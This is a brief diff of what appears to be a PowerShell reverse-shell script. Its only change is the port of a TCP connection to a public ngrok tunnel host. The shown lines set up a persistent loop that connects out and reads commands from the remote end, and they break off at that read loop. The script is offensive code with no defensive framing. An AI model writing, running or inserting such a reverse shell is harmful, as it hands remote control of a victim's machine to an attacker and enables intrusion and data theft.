@@ -1,6 +1,6 @@
 While($true) {
     Try {
-        Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient('0.tcp.ap.ngrok.io',12746));
+        Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient('0.tcp.ap.ngrok.io',16697));
         Set-Variable -Name stream -Value ($client.GetStream());
         [byte[]]$bytes = 0..65535|%{0};
         while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0) {
